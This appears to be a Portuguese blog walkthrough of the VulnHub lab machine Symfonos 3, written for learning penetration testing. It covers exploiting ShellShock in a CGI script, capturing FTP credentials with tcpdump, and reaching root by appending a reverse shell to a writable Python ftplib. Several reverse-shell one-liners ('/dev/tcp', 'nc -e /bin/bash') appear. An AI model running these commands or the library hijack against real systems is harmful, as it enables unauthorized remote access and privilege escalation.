---
title: "VulnHub - Symfonos 3"
tags: [Linux,Medium,PSPY,Gobuster,ShellShock,BurpSuite,Wireshark,FTP,Web]
categories: VulnHub OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/inicial.png)

Link: <https://www.vulnhub.com/entry/symfonos-31,332/>

# Enumeração

## Primeiro passo é rodar o arp-scan para detectarmos os hosts

```bash
arp-scan -I eth1 192.168.56.100/24
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/arp.png)

## Segundo passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 3 portas abertas no servidor

> Porta 21 -> Servidor FTP

> Porta 22 -> Servidor SSH

> Porta 80 -> Servidor Web

## Enumeração da Porta 21 (FTP)

Primeira coisa é tentarmos login anonimo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/ftp.png)

Não deu certo... então vamos procurar exploits para essa versão do ftp

```bash
searchsploit ProFTPD 1.3.5
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/ftp1.png)

## Enumeração da Porta 80 (Web)

Abrimos ela no navegador pra se tem algo de interessante

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/web.png)

Vamos rodar o gobuster também

```bash
gobuster dir -u http://192.168.56.107/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 50
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/web1.png)

Encontramos esse **/gate** vamos ver ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/web2.png)

Certo, outro gobuster nele

```bash
gobuster dir -u http://192.168.56.107/gate -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 50
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/web3.png)

Encontramos esse **/cerberus** vamos ver ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/web4.png)

Certo, outro gobuster nele

```bash
gobuster dir -u http://192.168.56.107/gate/cerberus -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 50
```

Troquei a lista pra medium, e mesmo assim não achou nada

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/web5.png)

### Encontrando o CGI-BIN/

Aqui foi interessante, tem que prestar bastante atenção, pq senão não encontramos essa pasta cgi-bin, que vai nos dar acesso à máquina...

Mas por que não? A wordlist que eu utiliza (que é boa por sinal) não tem a palavra cgi-bin/, sim, com a / no final...

Pô, mas isso faz diferença?

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/lista.png)

Sim, faz, pq olha as diferentes respostas que o site da pra com a / ou sem a /

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/lista1.png)

Um da 404 e outro 403... interessante não? Então agora vamos rodar o gobuster novamente com uma wordlist que possua o cgi-bin/

```bash
gobuster dir -u http://192.168.56.107/cgi-bin/ -w /usr/share/wordlists/dirb/big.txt -t 100
```

Achamos!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/lista2.png)

Agora rodamos novamente o gobuster dentro do cgi-bin pra ver se tem algo que possamos fazer

```bash
gobuster dir -u http://192.168.56.107/cgi-bin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 100
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/lista3.png)

Encontramos esse **underworld** e verificamos o que ele faz...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/lista4.png)

Pareceu muito um `uptime`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/lista5.png)

E sim! É um comando... Isso nos remeteu de cara pra a vulnerabilidade conhecida por `shellshock`

# ShellShock

Já explorei ela em outra máquina aqui no blog, a máquina Shocker do HackTheBox, então caso tenha alguma dúvida ainda sobre ela depois de terminar essa máquina, da uma passada lá, e caso ainda não esclareça, me mande uma mensagem ou comente no post, que a gente vai conversando

/cgi-bin é uma pasta usada no servidor para deixar os scripts que interagem com servidor Web, no caso temos um script executando um comando ai

```bash
nmap -sV -p80 --script http-shellshoch --script-args uri=/cgi-bin/underworld,cmd=ls 192.168.56.107
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/shellshock.png)

Sim, é vulnerável, mas não executou nosso comando... vamos mostrar dois modos de se explorar ele agora, tentando explicar, um modo todo manual e outro com o script pronto

## Manual

Primeiro passo é jogar pro burpsuite essa requisição e fazer o burp um proxy, pra gente ver exatamente o que está acontecendo

Abrimos o burp, vamos em **Proxy**, **Add**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/burp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/burp1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/burp2.png)

Pronto, agora está setado pra receber as conexões do localhost na porta 8001 e redirecionar pro 192.168.56.107 na porta 80

Então, refazemos o scan

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/burp3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/burp4.png)

Mando ela para o Repeater, adiciono a chamada do /bin/ls (tem que ser o caminho absoluto do binário)

E ele é executado! Temos RCE

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/burp5.png)

### Reverse Shell

Agora é só pegar um reverse shell

```bash
/bin/bash -i >& /dev/tcp/192.168.56.102/443 0>&1
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/burp6.png)

## Automático

Também podemos fazer isso automaticamente, com um script pronto

```bash
searchsploit ShellShock
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/searchsploit.png)

Copiamos ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/searchsploit1.png)

### Reverse Shell

E executamos, ganhando uma reverse shell

```bash
php 34766.php -u http://192.168.56.107/cgi-bin/underworld/ -c "nc -e /bin/bash 192.168.56.102 443"
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/rev.png)

# Cerberus -> Hades

Então vamos iniciar a enumeração desse usuários na tentativa da escalação de privilégios.

Iremos utilizar o [linpeas](https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh) para realizar a enumeração

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/linpeas.png)

Baixamos e executamos na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/linpeas1.png)

Realmente não encontramos nada de interessante, apenas permissões a mais habilitadas no tcpdump e um outro usuário chamado hades

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/linpeas2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/linpeas3.png)

## PSPY

Após um bom tempo e não encontrar nada com scripts, resolvi rodar um monitorador de processos, pra ve se conseguimos algo, vou utilizar o [PSPY](https://github.com/DominicBreuker/pspy)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/pspy.png)

Baixamos ele pra nossa máquina (versão estática) e passo ele para a máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/pspy1.png)

Executamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/pspy2.png)

Após um tempo vemos algo que nos chamou atenção

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/pspy3.png)

## Tcpdump

Bom, pelo que vi ele faz um curl ai no localhost, tem alguma coisa de ftp (que eu sei que tem aberto na máquina)... Se ele faz um curl, que é requisição, pode ser que eu consiga pegar com o tcpdump, certo?

Então vamos capturar o tráfego

```bash
tcpdump -w ftp.pcap -i lo
# -w -> O arquivo em que vai salvar tudão
# -i lo -> Escutar a interface
```

Por que na loopback? Pq se você ver ali no curl do pspy, ele faz a requisição pro localhost... então possivelmente tem algo sendo enviado pra ele mesmo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/tcpdump.png)

Deixamos um tempo pra capturar as requisições, e passamos pra nossa máquina o arquivo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/tcpdump1.png)

Agora abrimos ele no Wireshark e encontramos credenciais do ftp do hades

```
USER hades
PASS PTpZTfU4vxgzvRBE
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/pass.png)

Logamos no ftp dele, mas nada de muito bom ali

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/pass1.png)

Mas podemos fazer um `su hades` e virar o usuário hades

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/pass2.png)

# Hades -> Root

Agora vamos iniciar a escalação de privilégio pra root através do hades

Então executamos o linpeas nele!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/hades.png)

Nada de útil... puts, isso ta ficando interessante...

Lembra daquele script que apareceu no pspy lá? Dentro da pasta /opt... vamos dar uma olhada nele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/script.png)

Ele está sendo executado como root! Isso mesmo... Mas não conseguimos alterar ele, pq não somos donos dele...

Mas se olharmos as bibliotecas que ele está importando, temos a `ftplib`, então vamos ver se temos permissões de escrita nessa biblioteca

Sim, podemos! Através do nosso grupo `gods`

```bash
ls -la /usr/lib/python2.7/ftplib.py
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/script1.png)

## Alterando ftplib

Então, vamos entrar ali ver o que podemos fazer, pelo que vemos ele import o módulo os... então podemos executar comandos de system

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/script2.png)

Adicionamos dentro dele um reverse shell pra gente

```bash
echo 'os.system("nc -e /bin/bash 192.168.56.102 443")' >> ftplib.py
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/script3.png)

## Shell de root

Agora é só esperar e receber o shell de root, pois quando ele executar o script **ftpclient.py** vai importar a **ftplib.py**, que tem nossa chamada para o shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/root.png)

Pegamos a flag

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-symfonos3/flag.png)